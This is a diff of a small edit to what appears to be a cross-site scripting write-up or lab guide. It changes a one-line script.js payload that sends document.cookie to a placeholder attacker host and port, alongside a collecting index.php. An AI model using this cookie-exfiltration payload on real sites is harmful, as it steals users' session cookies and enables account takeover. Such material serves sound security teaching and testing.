@@ -186,7 +186,7 @@ Create two files:
 **script.js**
 
 ```js
-new Image().src='http://OURIP/index.php?c='+document.cookie;
+new Image().src='http://OURIP:OURPO/index.php?c='+document.cookie;
 ```
 
 **index.php**
